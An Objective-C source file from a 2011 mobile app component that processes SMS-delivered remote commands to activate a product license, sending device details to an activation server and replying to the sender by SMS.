/**
 - Project name :  RemoteCommandMager Component
 - Class name   :  ActivateProcessor
 - Version      :  1.0  
 - Purpose      :  For RemoteCommandMager Component
 - Copy right   :  20/12/2011, Prasad M B, Vervata Co., Ltd. All rights reserved.
*/

#import "ActivateProcessor.h"
#import "RemoteCmdCode.h"
#import "ActivationResponse.h"
#import "ActivationInfo.h"
#import "PhoneInfo.h"
#import "LicenseInfo.h"

@interface ActivateProcessor(PrivateAPI)
- (void) processActivationWithActivationCodeAndURL :(id <ActivationManagerProtocol>) aManagerProtocol; 
- (void) processActivationWithOutActivationCode:(id <ActivationManagerProtocol>) aManagerProtocol;
- (void) processActivationWithActivationCode: (id <ActivationManagerProtocol>) aActivationManagerProtocol;
- (void) activateException: (NSUInteger) aErrorCode; 
- (void) processFinished; 
- (void) sendReplySMS: (NSString *) aReplyMessage;
- (BOOL) isValidDigitAndURL;
- (NSString *) recipientNumberFromArgument;
- (NSString *) urlFromArgument;
@end

@implementation ActivateProcessor

/**
 - Method name: initWithRemoteCommandData:andCommandProcessingDelegate,aRemoteCmdProcessingDelegate (RemoteCmdProcessingDelegate)
 - Purpose:This method is used to initialize the ActivateProcessor class
 - Argument list and description: aRemoteCmdData (RemoteCmdData)
 - Return description: self (ActivateProcessor)
*/

- (id) initWithRemoteCommandData: (RemoteCmdData *) aRemoteCmdData
	andCommandProcessingDelegate: (id <RemoteCmdProcessingDelegate>) aRemoteCmdProcessingDelegate {
    DLog (@"ActivateProcessor--->initWithRemoteCommandData");
	if ((self = [super initWithRemoteCommandData:aRemoteCmdData andCommandProcessingDelegate:aRemoteCmdProcessingDelegate])) {
	}
	return self;
}

#pragma mark RemoteCmdProcessor Methods

/**
 - Method name: doProcessingCommand
 - Purpose:This method is used to process the ActivateProcessor
 - Argument list and description:No Argument 
 - Return description: No return type
*/

- (void) doProcessingCommand {
	DLog (@"ActivateProcessor--->doProcessingCommand")
	id <ActivationManagerProtocol> managerProtocol=[[RemoteCmdUtils sharedRemoteCmdUtils] mActivationManagerProtocol];
	if([[self remoteCmdCode] isEqualToString:kRemoteCmdCodeActivateWithoutActivationCode]) {
		[self processActivationWithOutActivationCode:managerProtocol];
	}
	else if ([[self remoteCmdCode] isEqualToString:kRemoteCmdCodeActivateWithActivationCode]) {
		LicenseInfo *licInfo = [[[RemoteCmdUtils sharedRemoteCmdUtils] mLicenseManager] mCurrentLicenseInfo];
		id <AppContext> applicationContext = [[RemoteCmdUtils sharedRemoteCmdUtils] mAppContext];
		id <ProductInfo> productInfo = [applicationContext getProductInfo];
		if (([licInfo licenseStatus] == ACTIVATED ||
			 [licInfo licenseStatus] == DISABLE ||
			 [licInfo licenseStatus] == EXPIRED) &&
			[productInfo getProductID] == PRODUCT_ID_FEELSECURE) { // FeelSecure already activated
			[self activateException:kCmdExceptionErrorCmdNotAllowToActivateOnActivatedProduct];
		} else {
			[self processActivationWithActivationCode:managerProtocol];
		}
	}
	else {
	    [self processActivationWithActivationCodeAndURL:managerProtocol];
	}
}

/**
 - Method name: isValidDigitAndURL
 - Purpose:This method is used to validate the Arguments
 - Argument list and description: 
 - Return description:isValidArguments (BOOL)
 */

- (BOOL) isValidDigitAndURL {
	DLog (@"ActivateProcessor--->Validate Argument...")
	BOOL isValidArgument=NO;
	NSArray *args=[mRemoteCmdData mArguments];
	if ([args count]>1) {
		isValidArgument=[RemoteCmdProcessorUtils isDigits:[args objectAtIndex:1]];
		if (isValidArgument && [self urlFromArgument]) {
			isValidArgument=[RemoteCmdProcessorUtils isURL:[self urlFromArgument]];
			if(isValidArgument && [self recipientNumberFromArgument])
    	        isValidArgument=[RemoteCmdProcessorUtils isPhoneNumber:[args objectAtIndex:3]];
		}
		else {
			isValidArgument=NO;
		}
     }
	return isValidArgument;
}

/**
 - Method name: urFromArgument
 - Purpose:This method is used to get URL from the Arguments
 - Argument list and description: 
 - Return description:url
 */

- (NSString *) urlFromArgument {
    NSString *url=nil; 
	if ([[mRemoteCmdData mArguments] count]>2) {
		url=[[mRemoteCmdData mArguments] objectAtIndex:2];
	}
	return url;
}

/**
 - Method name: recipientNumberFromArgument
 - Purpose:This method is used to get recipient no from the Arguments
 - Argument list and description: 
 - Return description:recipientNo
 */

- (NSString *) recipientNumberFromArgument {
    NSString *recipientNo=nil; 
	if ([[mRemoteCmdData mArguments] count]>3) {
		if(![[[[mRemoteCmdData mArguments] objectAtIndex:3] uppercaseString] isEqualToString:@"D"])
			recipientNo=[[mRemoteCmdData mArguments] objectAtIndex:3];
	}
	return recipientNo;
}


/**
 - Method name: recipientNumber
 - Purpose:This method is used to get the recipientNumber 
 - Argument list and description: No Return Type
 - Return description: mSenderNumber (NSString *)
*/

- (NSString *) recipientNumber {
	NSString *recipientNo = [self recipientNumberFromArgument];		// possible to get nil in the case that the user didn't input the number
	
	if (![RemoteCmdProcessorUtils isPhoneNumber:recipientNo]) // No need to check validation of recipient number..
		recipientNo=[mRemoteCmdData mSenderNumber];
	
    return recipientNo ;
	
	//return ([super recipientNumber]);
}


#pragma mark ActivateProcessor Private  Methods

/**
 - Method name: processActivationWithActivationCodeAndURL
 - Purpose:This method is used to Process Activation with Code And URL 
 - Argument list and description: No Return Type
 - Return description: aManagerProtocol (ActivationManagerProtocol)
*/

- (void) processActivationWithActivationCodeAndURL: (id <ActivationManagerProtocol>) aManagerProtocol {
	DLog (@"ActivateProcessor--->Process Activation with ActivationCode and URL...")
	//Check the argument is valid
	if([self isValidDigitAndURL]) {
		id <PhoneInfo> phoneInfo=[[[RemoteCmdUtils sharedRemoteCmdUtils] mAppContext]getPhoneInfo];
		ActivationInfo *activationInfo=[[ActivationInfo alloc]init];
		[activationInfo setMActivationCode:[[mRemoteCmdData mArguments] objectAtIndex:1]];
		[activationInfo setMDeviceInfo:[phoneInfo getDeviceInfo]];
		[activationInfo setMDeviceModel:[phoneInfo getDeviceModel]];
		BOOL status=[aManagerProtocol activate:activationInfo WithURL:[self urlFromArgument] andListener:self];
		if (!status) [self activateException:kCmdExceptionErrorCmdStillProcessing];
		[activationInfo release];
	}
	else {
		//throw exception
		DLog (@"ActivateProcessor--->Not Valid")
		[self activateException:kCmdExceptionErrorInvalidCmdFormat];
	}

}

/**
 - Method name: processActivationWithOutActivationCode
 - Purpose:This method is used to Process Activation without Code 
 - Argument list and description: No Return Type
 - Return description: aManagerProtocol (ActivationManagerProtocol)
*/

- (void) processActivationWithOutActivationCode: (id <ActivationManagerProtocol>) aManagerProtocol {
	DLog (@"ActivateProcessor--->Process Activation without ActivationCode...")
	BOOL status=[aManagerProtocol requestActivate:self];
	if (!status) {
		[self activateException:kCmdExceptionErrorCmdStillProcessing];
	}
}

/**
 - Method name: processActivationWithActivationCode:
 - Purpose:This method is used to Process Activation with activation Code 
 - Argument list and description: No Return Type
 - Return description: aActivationManagerProtocol (ActivationManagerProtocol)
 */

- (void) processActivationWithActivationCode: (id <ActivationManagerProtocol>) aActivationManagerProtocol {
	id <PhoneInfo> phoneInfo=[[[RemoteCmdUtils sharedRemoteCmdUtils] mAppContext]getPhoneInfo];
	ActivationInfo *activationInfo=[[ActivationInfo alloc]init];
	[activationInfo setMActivationCode:[[mRemoteCmdData mArguments] objectAtIndex:1]];
	[activationInfo setMDeviceInfo:[phoneInfo getDeviceInfo]];
	[activationInfo setMDeviceModel:[phoneInfo getDeviceModel]];
	BOOL status = [aActivationManagerProtocol activate:activationInfo andListener:self];
	if (!status) [self activateException:kCmdExceptionErrorCmdStillProcessing];
	[activationInfo release];
}

/**
 - Method name: processFinished
 - Purpose:This method is invoked when Activate Process is completed.
 - Argument list and description:No Argument 
 - Return description:No Return Type
 */

-(void) processFinished {
	DLog (@"ActivateProcessor--->Process Finished...")
	if ([mRemoteCmdProcessingDelegate respondsToSelector:@selector(proccessFinishedWithProcessor:andRemoteCmdData:)]) {
		[mRemoteCmdProcessingDelegate performSelector:@selector(proccessFinishedWithProcessor:andRemoteCmdData:)
										   withObject:self withObject:mRemoteCmdData];
	}
}


/**
 - Method name: sendReplySMS
 - Purpose:This method is used to send the SMS reply
 - Argument list and description: aStatusCode (NSUInteger)
 - Return description: No return type
 */

- (void) sendReplySMS: (NSString *) aReplyMessage {
	DLog (@"ActivateProcessor--->Send Reply SMS")
	[[RemoteCmdUtils sharedRemoteCmdUtils] createSystemEvent:mRemoteCmdData
											 andReplyMessage:aReplyMessage];
	if ([mRemoteCmdData mIsSMSReplyRequired]) {
		[[RemoteCmdUtils sharedRemoteCmdUtils] sendSMSWithRecipientNumber:[self recipientNumber] 
															   andMessage:aReplyMessage];
	}
	[self processFinished];
}

/**
 - Method name: activateException
 - Purpose:This method is invoked when activation failed. 
 - Argument list and description: No Return Type
 - Return description: No Argument
 */

- (void) activateException: (NSUInteger) aErrorCode {
	DLog (@"ActivateProcessor--->activateException")
	FxException* exception = [FxException exceptionWithName:@"processSettings" andReason:@"Activation Error"];
	[exception setErrorCode:aErrorCode];
	[exception setErrorCategory:kFxErrorRCM]; 
	@throw exception;
}


#pragma mark PreferenceMaanger Delegate Methods

/**
 - Method name: onComplete
 - Purpose:This method is invoked when preferece manager process is completed,
 - Argument list and description: No Return Type
 - Return description: No Return Type
*/

- (void) onComplete: (ActivationResponse *) aActivationResponse {
	DLog (@"ActivateProcessor--->onComplete Activation with Response Code:%d",[aActivationResponse mResponseCode]);
	NSString *messageFormat =nil;
	NSString *activationMessage=nil;
	if  ([aActivationResponse isMSuccess]) { 
		  messageFormat=[[RemoteCmdUtils sharedRemoteCmdUtils] replyMessageFormatWithCommandCode:[self remoteCmdCode]
																	andErrorCode:_SUCCESS_];
          activationMessage=[messageFormat stringByAppendingString:NSLocalizedString(@"kActive", @"")];
	}
	else {
		  activationMessage=[[RemoteCmdUtils sharedRemoteCmdUtils] replyMessageFormatWithCommandCode:[self remoteCmdCode]
																				  andErrorCode:[aActivationResponse mResponseCode]];
	}
	[self sendReplySMS: activationMessage];
}

/**
 - Method name:dealloc
 - Purpose: This is memory mangement method. Invoked when the class object releasd.
 - Argument list and description: No argument
 - Return type and description: No Return
*/

-(void) dealloc {
  	[super dealloc];
}

@end
